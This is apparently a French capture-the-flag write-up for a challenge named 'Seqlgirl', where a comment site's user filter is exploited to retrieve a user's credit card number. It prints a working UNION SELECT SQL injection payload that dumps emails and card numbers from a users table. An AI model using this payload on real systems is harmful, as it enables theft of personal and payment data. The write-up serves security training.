# Seqlgirl

# Consigne
Voici un site de commentaires. Retrouvez le numéro de carte de crédit de l'utilisateur Luc Moreau.

## Solution
Après avoir testé différentes injections SQL, on trouve que l'injection suivante fonctionne :
```sql
Mettre cette injection SQL dans le champ Filtrer par User.
```
GamerPro2000' UNION SELECT email,credit_card_number,name FROM users --

## FLAG
5678901234567890
